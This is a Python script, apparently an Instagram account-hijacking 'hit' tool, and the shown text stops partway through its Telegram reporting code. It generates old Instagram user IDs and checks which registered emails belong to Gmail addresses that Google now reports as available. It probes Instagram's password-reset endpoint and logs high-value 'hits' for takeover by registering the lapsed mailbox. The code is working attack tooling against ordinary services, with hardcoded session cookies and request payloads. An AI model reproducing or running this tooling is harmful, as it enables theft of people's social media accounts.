import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
import gzip
import secrets
import threading
import webbrowser
from datetime import datetime
from threading import Thread
import requests
import telebot
from telebot import types

# ========== GITHUB AUTHENTICATION CONFIGURATION ==========
# CHANGE THIS TO YOUR GITHUB RAW FILE URL
GITHUB_AUTH_URL = "https://raw.githubusercontent.com/LEVIXX797/1/refs/heads/main/Trial%20acces"
# Example: GITHUB_AUTH_URL = "https://raw.githubusercontent.com/glitcharmy/instagram-tool/main/trial_users.txt"

# Cache for user data
user_auth_cache = {}
cache_time = 0
CACHE_DURATION = 60  # 1 minute cache

def fetch_users_from_github():
    """Fetch users auth data from GitHub (Password, Expiry)"""
    global user_auth_cache, cache_time
    
    # Check if cache is still valid
    current_time = time.time()
    if user_auth_cache and (current_time - cache_time) < CACHE_DURATION:
        return user_auth_cache
    
    try:
        print(f"\033[96m[🌐] Fetching trial data from GitHub...\033[0m")
        response = requests.get(GITHUB_AUTH_URL, timeout=10)
        response.raise_for_status()
        
        users = {}
        for line in response.text.strip().splitlines():
            line = line.strip()
            # Skip empty lines and comments
            if line and not line.startswith('#'):
                parts = line.split('|')
                if len(parts) >= 2:
                    password = parts[0].strip()
                    expiry_date = parts[1].strip()
                    users[password] = {
                        'expiry': expiry_date
                    }
        
        user_auth_cache = users
        cache_time = current_time
        print(f"\033[92m[✅] Loaded {len(users)} trial passwords from GitHub\033[0m")
        return users
        
    except requests.exceptions.RequestException as e:
        print(f"\033[91m[❌] Failed to fetch trial data from GitHub: {e}\033[0m")
        return user_auth_cache if user_auth_cache else {}
    except Exception as e:
        print(f"\033[91m[❌] Error: {e}\033[0m")
        return user_auth_cache if user_auth_cache else {}

def verify_github_user(password):
    """Verify password against GitHub data"""
    users = fetch_users_from_github()
    
    if password not in users:
        return False, None, "PASSWORD_NOT_FOUND"
    
    return True, users[password]['expiry'], "SUCCESS"

def check_expiry(expiry_date_str):
    """Check if access has expired"""
    try:
        current_time = datetime.now()
        expiry_time = datetime.strptime(expiry_date_str, '%Y-%m-%d %H:%M:%S')
        
        if current_time > expiry_time:
            return False, expiry_time
        return True, expiry_time
    except Exception as e:
        print(f"\033[91m[❌] Date parsing error: {e}\033[0m")
        return False, None

def github_auth_system():
    """TRIAL VERSION - GitHub authentication (Password + Expiry only)"""
    print(f"\n\033[96m╔══════════════════════════════════════════════════════════╗\033[0m")
    print(f"\033[96m║           🔐 TRIAL VERSION AUTHENTICATION                ║\033[0m")
    print(f"\033[96m║           (PASSWORD • EXPIRY ONLY)                        ║\033[0m")
    print(f"\033[96m╚══════════════════════════════════════════════════════════╝\033[0m")
    
    max_attempts = 3
    attempt = 0
    
    while attempt < max_attempts:
        print(f"\n\033[93m┌─([{max_attempts - attempt} attempts remaining])\033[0m")
        password = input(f"\033[93m└──➤ \033[96mEnter Trial Password: \033[0m").strip()
        
        # Show loading animation
        print(f"\033[93m[⏳] Verifying from GitHub...\033[0m", end="", flush=True)
        time.sleep(1.5)
        
        valid, expiry_str, status = verify_github_user(password)
        
        if not valid:
            print(f"\r\033[91m[❌] Wrong password! Not found in GitHub database!                \033[0m")
            attempt += 1
            if attempt >= max_attempts:
                print(f"\n\033[91m[🔒] Too many failed attempts. Exiting...\033[0m")
                return False
            continue
        
        print(f"\r\033[92m[✅] Trial Password Verified from GitHub!                \033[0m")
        
        # Check expiry
        is_active, expiry_dt = check_expiry(expiry_str)
        
        if is_active:
            # Calculate remaining time
            remaining = expiry_dt - datetime.now()
            days = remaining.days
            hours, rem = divmod(remaining.seconds, 3600)
            minutes, seconds = divmod(rem, 60)
            
            print(f"\n\033[92m╔══════════════════════════════════════════════════════════╗\033[0m")
            print(f"\033[92m║           ✅ TRIAL ACCESS GRANTED                         ║\033[0m")
            print(f"\033[92m╠══════════════════════════════════════════════════════════╣\033[0m")
            print(f"\033[96m║  📅 Expiry Date : {expiry_dt.strftime('%Y-%m-%d %H:%M:%S'):<47} ║\033[0m")
            print(f"\033[96m║  ⏳ Time Left   : {days}d {hours}h {minutes}m {seconds}s{' ' * (30 - len(f'{days}d {hours}h {minutes}m {seconds}s'))}║\033[0m")
            print(f"\033[92m╚══════════════════════════════════════════════════════════╝\033[0m")
            
            time.sleep(2)
            return True
        else:
            print(f"\n\033[91m╔══════════════════════════════════════════════════════════╗\033[0m")
            print(f"\033[91m║           ❌ TRIAL ACCESS EXPIRED                        ║\033[0m")
            print(f"\033[91m╠══════════════════════════════════════════════════════════╣\033[0m")
            print(f"\033[93m║  Your trial expired on:                                  ║\033[0m")
            print(f"\033[93m║  {expiry_dt.strftime('%Y-%m-%d %H:%M:%S'):<47} ║\033[0m")
            print(f"\033[91m║                                                          ║\033[0m")
            print(f"\033[91m║  Contact @GL1T520 or @D3VXX to get premium access       ║\033[0m")
            print(f"\033[91m╚══════════════════════════════════════════════════════════╝\033[0m")
            return False
    
    return False

# Color definitions
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\x1b[1;31m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
L = '\x1b[1;95m'
C = '\x1b[2;35m'
A = '\x1b[1;90m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
Z1 = '\x1b[2;31m'
G = '\x1b[1;34m'
K = '\x1b[1;31m'
Y = '\x1b[1;32m'
S = '\x1b[1;33m'
M = '\x1b[1;36m'
E = '\x1b[1;32m'
color = '\x1b[91m'
reset = '\x1b[0m'

# Additional color definitions
RED = '\x1b[91m'
GREEN = '\x1b[92m'
YELLOW = '\x1b[93m'
BLUE = '\x1b[94m'
CYAN = '\x1b[96m'
WHITE = '\x1b[97m'

# Global variables
total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}
MIN_FOLLOWERS = 0
MIN_POSTS = 0
SELECTED_YEAR = 0
TOKEN = ""
ID = ""
bot = None

# Constants
GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'
TOKEN_FILE = 'InstaTool Token File.txt'
instatool_domain = '@gmail.com'

# Year ranges for user ID selection
year_ranges = {
    1: (1279001, 17750000, 2010),
    2: (17750000, 279760000, 2011),
    3: (279760000, 900990000, 2012),
    4: (900990000, 1629010000, 2013),
    5: (1629010000, 2500000000, 2014),
    6: (2500000000, 3713668786, 2015),
    7: (3713668786, 5699785217, 2016),
    8: (5699785217, 8507940634, 2017),
    9: (8507940634, 21254029834, 2018)
}

def progress_bar(task="Processing", duration=2):
    """Simple progress bar"""
    for i in range(21):
        percent = int((i/20) * 100)
        bar = "█" * i + "-" * (20 - i)
        sys.stdout.write(f"\r{task}: |{bar}| {percent}%")
        sys.stdout.flush()
        time.sleep(duration / 20)
    print()

def print_processing_bar():
    """Display processing bar"""
    for i in range(51):
        percent = int((i/50) * 100)
        bar = "█" * i + "-" * (50 - i)
        sys.stdout.write(f"\r{YELLOW}Processing: |{bar}| {percent}%{reset}")
        sys.stdout.flush()
        time.sleep(0.02)
    print()

def get_account_age(user_id):
    """Calculate account creation year and month based on user ID"""
    year_months = {
        2010: {'min_id': 1, 'max_id': 1279000, 'months': {
            'October': (1, 319750), 'November': (319751, 639500), 'December': (639501, 1279000)
        }},
        2011: {'min_id': 1279001, 'max_id': 17750000, 'months': {
            'January': (1279001, 2557500), 'February': (2557501, 3836000),
            'March': (3836001, 5114500), 'April': (5114501, 6393000),
            'May': (6393001, 7671500), 'June': (7671501, 8950000),
            'July': (8950001, 10228500), 'August': (10228501, 11507000),
            'September': (11507001, 12785500), 'October': (12785501, 14064000),
            'November': (14064001, 15342500), 'December': (15342501, 17750000)
        }},
        2012: {'min_id': 17750001, 'max_id': 279760000, 'months': {
            'January': (17750001, 39258750), 'February': (39258751, 60767500),
            'March': (60767501, 82276250), 'April': (82276251, 103785000),
            'May': (103785001, 125293750), 'June': (125293751, 146802500),
            'July': (146802501, 168311250), 'August': (168311251, 189820000),
            'September': (189820001, 211328750), 'October': (211328751, 232837500),
            'November': (232837501, 254346250), 'December': (254346251, 279760000)
        }},
        2013: {'min_id': 279760001, 'max_id': 900990000, 'months': {
            'January': (279760001, 331382500), 'February': (331382501, 383005000),
            'March': (383005001, 434627500), 'April': (434627501, 486250000),
            'May': (486250001, 537872500), 'June': (537872501, 589495000),
            'July': (589495001, 641117500), 'August': (641117501, 692740000),
            'September': (692740001, 744362500), 'October': (744362501, 795985000),
            'November': (795985001, 847607500), 'December': (847607501, 900990000)
        }},
        2014: {'min_id': 900990001, 'max_id': 1629010000, 'months': {
            'January': (900990001, 966665000), 'February': (966665001, 1032340000),
            'March': (1032340001, 1098015000), 'April': (1098015001, 1163690000),
            'May': (1163690001, 1229365000), 'June': (1229365001, 1295040000),
            'July': (1295040001, 1360715000), 'August': (1360715001, 1426390000),
            'September': (1426390001, 1492065000), 'October': (1492065001, 1557740000),
            'November': (1557740001, 1623415000), 'December': (1623415001, 1629010000)
        }},
        2015: {'min_id': 1629010001, 'max_id': 2500000000, 'months': {
            'January': (1629010001, 1751925000), 'February': (1751925001, 1874840000),
            'March': (1874840001, 1997755000), 'April': (1997755001, 2120670000),
            'May': (2120670001, 2243585000), 'June': (2243585001, 2366500000),
            'July': (2366500001, 2489415000), 'August': (2489415001, 2500000000)
        }},
        2016: {'min_id': 2500000001, 'max_id': 3713668786, 'months': {
            'January': (2500000001, 2651708750), 'February': (2651708751, 2803417500),
            'March': (2803417501, 2955126250), 'April': (2955126251, 3106835000),
            'May': (3106835001, 3258543750), 'June': (3258543751, 3410252500),
            'July': (3410252501, 3561961250), 'August': (3561961251, 3713668786)
        }},
        2017: {'min_id': 3713668787, 'max_id': 5699785217, 'months': {
            'January': (3713668787, 3961695000), 'February': (3961695001, 4209722500),
            'March': (4209722501, 4457750000), 'April': (4457750001, 4705777500),
            'May': (4705777501, 4953805000), 'June': (4953805001, 5201832500),
            'July': (5201832501, 5449860000), 'August': (5449860001, 5699785217)
        }},
        2018: {'min_id': 5699785218, 'max_id': 8597939245, 'months': {
            'January': (5699785218, 5941605000), 'February': (5941605001, 6183425000),
            'March': (6183425001, 6425245000), 'April': (6425245001, 6667065000),
            'May': (6667065001, 6908885000), 'June': (6908885001, 7150705000),
            'July': (7150705001, 7392525000), 'August': (7392525001, 7634345000),
            'September': (7634345001, 7876165000), 'October': (7876165001, 8117985000),
            'November': (8117985001, 8359805000), 'December': (8359805001, 8597939245)
        }},
        2019: {'min_id': 8597939246, 'max_id': 21254029834, 'months': {
            'January': (8597939246, 9665000000), 'February': (9665000001, 10732060750),
            'March': (10732060751, 11799121475), 'April': (11799121476, 12866182200),
            'May': (12866182201, 13933242925), 'June': (13933242926, 15000303650),
            'July': (15000303651, 16067364375), 'August': (16067364376, 17134425100),
            'September': (17134425101, 18201485825), 'October': (18201485826, 19268546550),
            'November': (19268546551, 20335607275), 'December': (20335607276, 21254029834)
        }}
    }
    
    for year, data in year_months.items():
        if data['min_id'] <= user_id <= data['max_id']:
            for month, (min_id, max_id) in data['months'].items():
                if min_id <= user_id <= max_id:
                    return year, month
    return 2023, 'Unknown'

def safe_int_input(prompt, default):
    """Safe integer input with default value"""
    try:
        value = input(prompt).strip()
        return int(value) if value else default
    except:
        return default

def get_user_id_by_year(year_choice):
    """Get user ID range based on year selection"""
    if year_choice in year_ranges:
        min_id, max_id, year = year_ranges[year_choice]
        return random.randint(min_id, max_id), year
    else:
        return random.randint(3713668786, 21254029834), 2015

def generate_user_agent():
    """User-Agent generator"""
    versions = ['13.1.2', '13.1.1', '13.0.5', '12.1.2', '12.0.3']
    oss = [
        'Macintosh; Intel Mac OS X 10_15_7',
        'Macintosh; Intel Mac OS X 10_14_6',
        'iPhone; CPU iPhone OS 14_0 like Mac OS X',
        'iPhone; CPU iPhone OS 13_6 like Mac OS X'
    ]
    
    version = random.choice(versions)
    platform = random.choice(oss)
    
    user_agent = f'Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0'
    return user_agent

def check_instagram_email(mail):
    """Instagram email check"""
    url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
    
    headers = {
        'X-Csrftoken': secrets.token_hex(16),
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Origin': 'https://www.instagram.com',
        'Referer': 'https://www.instagram.com/accounts/signup/email/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7'
    }
    
    data = {'email': mail}
    
    try:
        res = requests.post(url, headers=headers, data=data, timeout=10).text
        return 'email_is_taken' in res
    except Exception:
        return False

def get_reset_info(fr):
    """Instagram reset info"""
    url = 'https://www.instagram.com/async/wbloks/fetch/'
    
    params = {
        'appid': 'com.bloks.www.caa.ar.search.async',
        'type': 'action',
        '__bkv': 'cc4d2103131ee3bbc02c20a86f633b7fb7a031cbf515d12d81e0c8ae7af305dd'
    }
    
    payload = {
        '__d': 'www',
        '__user': '0',
        '__a': '1',
        '__req': '9',
        '__hs': '20475.HYP:instagram_web_pkg.2.1...0',
        'dpr': '3',
        '__ccg': 'GOOD',
        '__rev': '1032300900',
        '__s': 'nrgu8k:vm015z:oanvx6',
        '__hsi': '7598106668658828571',
        '__dyn': '7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Qw5Mx62G3i1ywOwv89k2C1Fwc60D82Ixe0EUjwGzEaE2iwNwmE2eUlwhEe87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK1sAwHxW1owLwHwGwa6byohw5yweu',
        '__csr': 'gLff3k5T92cDYAyT4Wkxh5bGhjehqjDVuhUCUya8u889hp8ydihrghXG9yGxGm2m9Gu59rxd0KAzy29oKbyUqxyfxOm7VEWfxDKiGgS4Uf98iJ0zGcKEqz89U5G4ry88bxqfzE9UeEGfw34U01oL8dHK0cvN00pOwywQV9o1uO00LYwcjw7Tgvg6Je1rwko2xDg19o68wgwGoaUiw7to66UjgmRw3MXw0yqw0sO8092U0myw',
        '__hsdp': 'n0I43m1iQhGIiFckEKrBZvIj2SKUl8FeSE9Q08xyoC0x80sAw1TK0GU3xU1jE31w9y095waN04Uw',
        '__hblp': '0dO0Coco1ME884u9wcC2t0lUbo22wzx61mDw5Pw4OwsoboK0sm0FE620cizU5W0bAz8W0wEGuq08Owc60C80xu2S0H40jy1dwDzo2Ow61w',
        '__sjsp': 'n0I43m1iQhGIiFckEKrBZvIRh4rHK5iaqSE0AG9yo',
        '__comet_req': '7',
        'lsd': 'AdJv3Nfv2cg',
        'jazoest': '2958',
        '__spin_r': '1032300900',
        '__spin_b': 'trunk',
        '__spin_t': '1769072066',
        '__crn': 'comet.igweb.PolarisWebBloksAccountRecoveryRoute',
        'params': '{"params":"{\\"server_params\\":{\\"event_request_id\\":\\"3a359125-0214-4c12-9516-8779938e6188\\",\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"47361890900104\\",\\"device_id\\":\\"\\",\\"family_device_id\\":null,\\"waterfall_id\\":\\"69517426-942a-45d2-8ac7-e4f11a60412a\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"context_data\\":\\"Ac_RWrril-QBHwJ5esJkO0r_7Q6DijxM0ntnpV72Xwb9pwsT_1irnjiemlrD4UrE8SZUidlwtGeIAdKnN9x0Yt2xwljNTR9nNNdvl5IBdQTVzfy-m4keAoyj2DJC0XaijIwHZoblRGk2SZCZqPZ2356akgjRVowNkYgDbwOOxTdeBRyLAz7akj7KXpnBIRKbYdGn7zGOhcNzNlMwLmfvjOpjevZSZ-fPAgKvYAqbbU1igFi7kJW7Lmz8ltK5l-jl6iabxQzMgtEi-Nll6Apb4I-H_6OqU1x7ckCuv-pKy_oPMRzNgvz2omC1ELg5fb6FearpkUsZyWEjsFgUGhmkz-WLIA8CNBXJ10VAC1ypksrM6RXfzZKJqtz569eaxG-dw9FLpDJX0-_wgFqzqYKWtJIdB_GZXwpLD2VLOd-aXfHN0SWjWSI|arm\\"},\\"client_input_params\\":{\\"zero_balance_state\\":null,\\"search_query\\":\\"f{1453}\\",\\"fetched_email_list\\":[],\\"fetched_email_token_list\\":{},\\"sso_accounts_auth_data\\":[],\\"sfdid\\":\\"\\",\\"text_input_id\\":\\"7tzaot:101\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"was_headers_prefill_available\\":0,\\"was_headers_prefill_used\\":0,\\"ig_oauth_token\\":[],\\"android_build_type\\":\\"\\",\\"is_whatsapp_installed\\":0,\\"device_network_info\\":null,\\"accounts_list\\":[],\\"is_oauth_without_permission\\":0,\\"search_screen_type\\":\\"email_or_username\\",\\"ig_vetted_device_nonce\\":\\"\\",\\"gms_incoming_call_retriever_eligibility\\":\\"client_not_supported\\",\\"auth_secure_device_id\\":\\"\\",\\"network_bssid\\":null,\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}'
    }
    
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'sec-ch-ua-full-version-list': '"Not(A:Brand";v="8.0.0.0", "Chromium";v="144.0.7559.76", "Google Chrome";v="144.0.7559.76"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-model': '"23090RA98I"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua-platform-version': '"15.0.0"',
        'origin': 'https://www.instagram.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.instagram.com/accounts/password/reset/',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'priority': 'u=1, i',
        'Cookie': 'ig_did=886A3671-95EB-4016-9618-6504E3C60331; mid=aV938wABAAGNLqQD0prSU56ivhek; csrftoken=3xQbJVCm8wRdlSXKaXxztd; datr=HXhfaRa1lVxxpoC1K89YyZiA; ig_nrcb=1; wd=406x766'
    }
    
    try:
        fff = payload['params']
        fff = fff.replace('f{1453}', fr)
        payload['params'] = fff
        
        response = requests.post(url, params=params, data=payload, headers=headers, timeout=15)
        data = response.content
        
        try:
            data = gzip.decompress(data)
        except:
            pass
        
        try:
            import brotli
            data = brotli.decompress(data)
        except:
            pass
        
        r = data.decode('utf-8', 'ignore')
        
        if response.status_code == 200:
            return '✅ Reset Available'
        else:
            return '❌ Reset Not Available'
            
    except Exception as e:
        return f'⚠️ Reset Error'

def update_stats():
    """Update and display statistics"""
    global hits, good_ig, bad_insta, MIN_FOLLOWERS, MIN_POSTS, SELECTED_YEAR
    
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f'''
 ╔══════════════════════════════════╗
      📊 INSTAGRAM STATS [TRIAL]
╚══════════════════════════════════╝

{F}➤ Instagram Hits   : {P}{hits}
{B}➤ Good Emails      : {P}{good_ig}
{Z}➤ Bad Emails       : {P}{bad_insta}
{Y}➤ Min Followers    : {P}{MIN_FOLLOWERS}
{C}➤ Min Posts        : {P}{MIN_POSTS}
{M}➤ Target Year      : {P}{SELECTED_YEAR}

══════════════════════════════════

⚙️ DEVELOPER : @GL1T520 & @D3VXX
📢 TG CHANNEL : @glitch_army01
''')

def instatool():
    """Token creation function"""
    alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
    
    n1 = ''.join(random.choice(alphabet) for _ in range(random.randrange(6, 9)))
    n2 = ''.join(random.choice(alphabet) for _ in range(random.randrange(3, 9)))
    host = ''.join(random.choice(alphabet) for _ in range(random.randrange(15, 30)))
    
    headers = {
        'accept': '*/*',
        'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
        CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
        'google-accounts-xsrf': '1',
        USER_AGENT_HEADER: str(generate_user_agent())
    }
    
    recovery_url = f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
    
    try:
        res1 = requests.get(recovery_url, headers=headers)
        
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        
        cookies = {'__Host-GAPS': host}
        
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            USER_AGENT_HEADER: generate_user_agent()
        }
        
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }
        
        response = requests.post(
            f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
            cookies=cookies,
            headers=headers2,
            data=data
        )
        
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")
            
    except Exception as e:
        print(e)
        instatool()

def check_gmail(email):
    """Gmail availability check"""
    global hits, good_ig, bad_email, infoinsta, instatool_domain, TOKEN, ID
    
    if '@' in email:
        email = email.split('@')[0]
    
    try:
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
    except:
        return
    
    tl, host = token_data.split('//')
    
    cookies = {'__Host-GAPS': host}
    
    headers = {
        AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
        'google-accounts-xsrf': '1',
        ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
        REFERRER_HEADER: f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}',
        USER_AGENT_HEADER: generate_user_agent()
    }
    
    params = {'TL': tl}
    
    data = f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    
    try:
        response = requests.post(
            f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
            params=params,
            cookies=cookies,
            headers=headers,
            data=data
        )
        
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            
            full_email = email + instatool_domain
            username, domain = full_email.split('@')
            
            user_id = infoinsta.get(username, {}).get('pk', 0)
            if user_id:
                account_year, account_month = get_account_age(int(user_id))
            else:
                account_year, account_month = 2023, 'Unknown'
            
            InfoAcc(username, domain, user_id, account_year, account_month)
        else:
            bad_email += 1
            update_stats()
            
    except Exception:
        pass

def check(email, user_id=0, followers=0, posts=0):
    """Main check function"""
    global good_ig, bad_insta
    
    try:
        email_exists = check_instagram_email(email)
        
        if email_exists:
            if followers >= MIN_FOLLOWERS and posts >= MIN_POSTS:
                if instatool_domain in email:
                    check_gmail(email)
                
                good_ig += 1
                update_stats()
            else:
                bad_insta += 1
                update_stats()
        else:
            bad_insta += 1
            update_stats()
    except Exception:
        bad_insta += 1
        update_stats()

def rest(user):
    """Reset info wrapper"""
    try:
        reset_info = get_reset_info(user)
        return reset_info
    except Exception as e:
        return f'⚠️ Reset Error'

def get_info_buttons(username):
    """Create inline keyboard buttons"""
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    dev_button = types.InlineKeyboardButton(
        "👨‍💻 𝐃ᴇᴠᴇʟᴏᴘᴇʀ", 
        url="https://t.me/gl1t520"
    )
    
    dev2_button = types.InlineKeyboardButton(
        "👨‍💻 𝐂ᴏ-𝐃ᴇᴠ", 
        url="https://t.me/D3VXX"
    )
    
    channel_button = types.InlineKeyboardButton(
        "📢 𝐂ʜᴀɴɴᴇʟ", 
        url="https://t.me/glitch_army01"
    )
    
    insta_button = types.InlineKeyboardButton(
        "🔗 𝐈ɴsᴛᴀ 𝐏ʀᴏғɪʟᴇ", 
        url=f"https://www.instagram.com/{username}"
    )
    
    close_button = types.InlineKeyboardButton(
        "❌ 𝐂ʟᴏsᴇ", 
        callback_data=f"close_{username}"
    )
    
    keyboard.add(dev_button, dev2_button)
    keyboard.add(channel_button)
    keyboard.add(insta_button)
    keyboard.add(close_button)
    
    return keyboard

def setup_callback_handlers(bot_instance):
    """Setup callback handlers for inline buttons"""
    
    @bot_instance.callback_query_handler(func=lambda call: call.data.startswith("close_"))
    def handle_close_callback(call):
        try:
            bot_instance.edit_message_reply_markup(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=None
            )
            bot_instance.answer_callback_query(call.id, "Message closed ✅")
        except Exception as e:
            print(f"Error closing message: {e}")
    
    @bot_instance.callback_query_handler(func=lambda call: True)
    def handle_other_callbacks(call):
        bot_instance.answer_callback_query(call.id, "Button pressed ✅")

def InfoAcc(username, domain, user_id, account_year, account_month):
    """Account info collection and sending"""
    global total_hits, TOKEN, ID, bot
    
    account_info = infoinsta.get(username, {})
    
    user_id = account_info.get('pk', user_id)
    full_name = account_info.get('full_name', 'N/A')
    followers = account_info.get('follower_count', 0)
    following = account_info.get('following_count', 0)
    posts = account_info.get('media_count', 0)
    bio = account_info.get('biography', 'No Bio')
    
    total_hits += 1
    
    if account_month != 'Unknown':
        account_age = f"{account_month} - {account_year}"
    else:
        account_age = f"{account_year}"
    
    followers_str = f"{followers:,}"
    following_str = f"{following:,}"
    posts_str = f"{posts:,}"
    
    info_text = f'''
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃      🔥 TRIAL 𝐈ɴsᴛᴀ 𝐇ɪᴛs 🔥               ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

┌────────────────────────────────────────────┐
│  📊 𝐒ᴛᴀᴛɪsᴛɪᴄs                           │
├────────────────────────────────────────────┤
│  🎯 𝐇ɪᴛs        ➜  {total_hits}             │
│  👤 𝐔sᴇʀɴᴀᴍᴇ    ➜  @{username}             │
│  📧 𝐄ᴍᴀɪʟ       ➜  {username}@{domain}     │
│  📅 𝐀ɢᴇ         ➜  {account_age}           │
├────────────────────────────────────────────┤
│  📈 𝐄ɴɢᴀɢᴇᴍᴇɴᴛ                           │
├────────────────────────────────────────────┤
│  🌟 𝐅ᴏʟʟᴏᴡᴇʀs   ➜  {followers_str}         │
│  ✨ 𝐅ᴏʟʟᴏᴡɪɴɢ   ➜  {following_str}         │
│  📸 𝐏ᴏsᴛs      ➜  {posts_str}              │
├────────────────────────────────────────────┤
│  📝 𝐁ɪᴏ        ➜  {bio[:50]}...            │
│  ♻️ 𝐑ᴇsᴇᴛ      ➜  {rest(username)}         │
└────────────────────────────────────────────┘

         🌐 𝐢ɴsᴛᴀɢʀᴀᴍ.ᴄᴏᴍ/{username}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'''
    
    print(f"{G}{info_text}{reset}")
    print(f"{Y}✓ Account meets requirements! (Min Followers: {MIN_FOLLOWERS}, Min Posts: {MIN_POSTS}){reset}")
    
    try:
        with open('instahits.txt', 'a', encoding='utf-8') as f:
            f.write(info_text + '\n')
            f.write(f"✓ Account meets requirements! (Min Followers: {MIN_FOLLOWERS}, Min Posts: {MIN_POSTS})\n\n")
    except:
        pass
    
    try:
        if TOKEN and ID and TOKEN != "" and ID != "":
            if bot is None:
                bot = telebot.TeleBot(TOKEN)
